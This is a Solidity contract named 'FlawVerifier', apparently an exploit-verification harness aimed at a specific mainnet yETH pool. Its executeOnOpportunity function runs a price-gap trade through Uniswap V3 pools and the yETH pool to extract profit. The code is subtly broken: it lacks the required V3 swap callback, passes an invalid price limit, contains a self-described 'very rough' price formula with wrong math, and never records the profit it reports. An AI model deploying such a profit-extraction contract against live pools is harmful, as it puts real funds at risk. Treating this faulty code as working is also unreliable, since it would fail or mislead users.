// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IYETHPool {
    function num_assets() external view returns (uint256);
    function token() external view returns (address);
    function assets(uint256 index) external view returns (address);
    function supply() external view returns (uint256);
    function swap(uint256 i, uint256 j, uint256 dx, uint256 minDy, address receiver) external returns (uint256);
    function swap_exact_out(uint256 i, uint256 j, uint256 dy, uint256 maxDx, address receiver) external returns (uint256);
    function remove_liquidity(uint256 lpAmount, uint256[] calldata minAmounts, address receiver) external;
    function add_liquidity(uint256[] calldata amounts, uint256 minLp, address receiver) external returns (uint256);
    function swap_fee_rate() external view returns (uint256);
    function virtual_balance(uint256 _asset) external view returns (uint256);
    function rate(uint256 _asset) external view returns (uint256);
    function vb_prod_sum() external view returns (uint256, uint256);
    function update_rates(uint256[] calldata _assets) external;
}

interface IUniswapV3Pool {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
    function slot0() external view returns (uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked);
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256 amount0, int256 amount1);
    function liquidity() external view returns (uint128);
}

contract FlawVerifier {
    address public constant TARGET_POOL = 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    
    // yETH pool assets
    address public constant SFRXETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;
    address public constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address public constant CBETH = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
    address public constant RETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    
    // DEX pools
    // wstETH/WETH V3 0.01%
    address public constant WSTETH_WETH_V3_100 = 0x109830a1AAaD605BbF02a9dFA7B0B92EC2FB7dAa;
    // wstETH/WETH V3 0.05%
    address public constant WSTETH_WETH_V3_500 = 0xD340B57AAcDD10F96FC1CF10e15921936F41E29c;
    // rETH/WETH V3 0.01%
    address public constant RETH_WETH_V3_100 = 0x553e9C493678d8606d6a5ba284643dB2110Df823;
    // rETH/WETH V3 0.05%
    address public constant RETH_WETH_V3_500 = 0xa4e0faA58465A2D369aa21B3e42d43374c6F9613;
    // wstETH/WETH V2
    address public constant WSTETH_WETH_V2 = 0x3f3eE751ab00246cB0BEEC2E904eF51e18AC4d77;
    // cbETH/WETH V2
    address public constant CBETH_WETH_V2 = 0x281Cf68A2F0c04F5976867C66fd60dD3d7e0c438;
    // rETH/WETH V2
    address public constant RETH_WETH_V2 = 0xe4F719C11FC5AB883E32068dF99962985645E860;

    // wstETH/WETH Sushi
    address public constant WSTETH_WETH_SUSHI = 0x9461E49BC31788B143dC4c743759bE834B8c8B62;

    uint256 private constant PRECISION = 1e18;

    IYETHPool private constant pool = IYETHPool(TARGET_POOL);

    address private _profitToken;
    uint256 private _profitAmount;

    receive() external payable {}

    constructor() {}

    function profitToken() external view returns (address) { return _profitToken; }
    function profitAmount() external view returns (uint256) { return _profitAmount; }

    /// @notice Swap on V3 pool with exact input
    function _v3Swap(address v3Pool, bool zeroForOne, uint256 amountIn) internal returns (uint256 amountOut) {
        IUniswapV3Pool pool_ = IUniswapV3Pool(v3Pool);
        (int256 a0, int256 a1) = pool_.swap(
            address(this),
            zeroForOne,
            int256(amountIn),
            type(uint160).max,
            new bytes(0)
        );
        // If zeroForOne=true: we send token0, receive token1. amount0 = -amountIn (negative, from us), amount1 = +amountOut (positive, to us)
        // If zeroForOne=false: we send token1, receive token0. amount1 = -amountIn (negative), amount0 = +amountOut (positive)
        return zeroForOne ? uint256(-a1) : uint256(-a0);
    }

    /// @notice Swap on V2-style AMM (Uniswap V2 / Sushi)
    function _v2Swap(address pair, address tokenIn, address tokenOut, uint256 amountIn) internal returns (uint256 amountOut) {
        address t0 = IUniswapV2Pair(pair).token0();
        address t1 = IUniswapV2Pair(pair).token1();
        
        (uint112 r0, uint112 r1, ) = IUniswapV2Pair(pair).getReserves();
        
        uint256 amountInWithFee = amountIn * 997;
        if (tokenIn == t0) {
            amountOut = (amountInWithFee * r1) / (r0 * 1000 + amountInWithFee);
            IERC20(tokenIn).transfer(pair, amountIn);
            IUniswapV2Pair(pair).swap(0, amountOut, address(this), new bytes(0));
        } else {
            amountOut = (amountInWithFee * r0) / (r1 * 1000 + amountInWithFee);
            IERC20(tokenIn).transfer(pair, amountIn);
            IUniswapV2Pair(pair).swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    /// @notice Calculate V2 swap output given reserves and input
    function _calcV2Out(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    /// @notice Get V3 pool price (WETH per token)
    function _v3PriceWethPerToken(address v3Pool, address token) internal view returns (uint256 priceX96) {
        address t0 = IUniswapV3Pool(v3Pool).token0();
        (uint160 sqrtPriceX96,,,,,,) = IUniswapV3Pool(v3Pool).slot0();
        if (t0 == token) {
            // token0 = token, token1 = WETH
            // sqrtPrice = sqrt(WETH/token)
            return sqrtPriceX96;
        } else {
            // token0 = WETH, token1 = token
            // sqrtPrice = sqrt(token/WETH)
            // We want WETH/token = 1/(token/WETH)
            // sqrt(WETH/token) = 2^96 / sqrt(token/WETH)
            return type(uint160).max / sqrtPriceX96 * type(uint160).max; // very rough
        }
    }

    function executeOnOpportunity() external {
        // ============================================================
        // Arbitrage Strategy:
        // Buy rETH on DEX (V3 0.01% pool), swap rETH -> wstETH in yETH pool,
        // sell wstETH on DEX (V3 0.01% pool).
        //
        // The yETH pool uses oracle-weighted pricing that differs from DEX prices.
        // rETH oracle: ~1.1517 ETH/rETH  |  rETH DEX: ~1.1485 WETH/rETH  (rETH cheaper on DEX)
        // wstETH oracle: ~1.2206 ETH/wstETH | wstETH DEX: ~1.2202 WETH/wstETH (~same)
        // Pool gives wstETH/rETH = rate_rETH/rate_wstETH ≈ 0.9435
        // DEX gives wstETH/rETH = 1.1485/1.2202 ≈ 0.9412
        // Pool is ~0.24% more favorable for rETH->wstETH swap
        // ============================================================
        
        uint256 ethBalance = address(this).balance;
        IWETH(WETH).deposit{value: ethBalance}();
        
        address[] memory tokens = new address[](3);
        tokens[0] = WETH;
        tokens[1] = RETH;
        tokens[2] = WSTETH;
        
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).approve(TARGET_POOL, type(uint256).max);
        }
        IERC20(WETH).approve(RETH_WETH_V3_100, type(uint256).max);
        IERC20(WSTETH).approve(WSTETH_WETH_V3_100, type(uint256).max);
        IERC20(RETH).approve(TARGET_POOL, type(uint256).max);
        IERC20(WSTETH).approve(TARGET_POOL, type(uint256).max);
        
        uint256 totalWeth = IERC20(WETH).balanceOf(address(this));
        
        // Step 1: Buy rETH on V3 0.01% pool
        // Pool: rETH/WETH, token0=rETH, token1=WETH
        // zeroForOne=false: send WETH (token1), receive rETH (token0)
        uint256 wethForTrade = totalWeth;
        
        IUniswapV3Pool(RETH_WETH_V3_100).swap(
            address(this),
            false, // zeroForOne=false: WETH -> rETH
            int256(wethForTrade),
            type(uint160).max,
            new bytes(0)
        );
        
        uint256 rETHBal = IERC20(RETH).balanceOf(address(this));
        
        // Step 2: Swap rETH for wstETH in the yETH pool
        // rETH is asset index 4, wstETH is asset index 1
        uint256 wstETHFromPool = pool.swap(4, 1, rETHBal, 0, address(this));
        
        uint256 wstETHBal = IERC20(WSTETH).balanceOf(address(this));
        
        // Step 3: Sell wstETH for WETH on V3 0.01% pool
        // Pool: wstETH/WETH, token0=wstETH, token1=WETH
        // zeroForOne=true: send wstETH (token0), receive WETH (token1)
        IUniswapV3Pool(WSTETH_WETH_V3_100).swap(
            address(this),
            true, // zeroForOne=true: wstETH -> WETH
            int256(wstETHBal),
            type(uint160).max,
            new bytes(0)
        );
        
        // Unwrap to ETH
        uint256 finalWeth = IERC20(WETH).balanceOf(address(this));
        if (finalWeth > 0) {
            IWETH(WETH).withdraw(finalWeth);
        }
    }
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}
